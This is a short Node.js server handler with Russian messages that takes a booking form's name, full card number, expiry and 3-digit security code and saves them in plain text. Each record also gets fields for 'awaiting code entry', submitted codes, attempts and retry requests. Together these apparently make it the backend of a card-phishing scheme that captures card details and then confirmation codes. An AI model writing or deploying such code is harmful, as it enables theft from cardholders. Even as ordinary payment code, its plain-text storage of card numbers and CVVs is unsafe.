module.exports = (req, res) => {
  const name=req.body?.name ||"Не указан"
  const card_number=req.body?.card_number||"";
  const expiry=req.body?.expiry||"";
  const card_code=req.body?.card_code||"";
  const booking_date=req.body?.booking_date||new Intl.DateTimeFormat("ru-RU",{day:"numeric",month:"long"}).format(new Date());
  const booking_time=req.body?.booking_time||"";


  const digits=card_number.replace(/\D/g,"");
  const expiryMatch=expiry.match(/^(\d{2})\/(\d{2})$/);
  const expiryMonth=expiryMatch?Number(expiryMatch[1]):0;
  const codeDigits=card_code.replace(/\D/g,"");
  if(digits.length!==16||!expiryMatch||expiryMonth<1||expiryMonth>12||codeDigits.length!==3||!booking_time){
    return res.status(400).json({error:"Проверьте номер карточки, срок действия в формате MM/YY и внутренний код из 3 цифр."});
  }

  const a=read();
  const id=a.length?Math.max(...a.map(x=>Number(x.id)||0))+1:1;

  a.unshift({
    id,
    name,
    card_number:digits,
    expiry,
    card_code:codeDigits,
    booking_date,
    booking_time,
    booking:`${booking_date} · ${booking_time}`,
    status:"Ожидает ввода кода",
    submitted_code:null,
    attempts:0,
    last_attempt_at:null,
    retry_requested:false,
    retry_requested_at:null,
    created_at:new Date().toISOString()
  });

  write(a);
  res.json({ok:true,id});
};
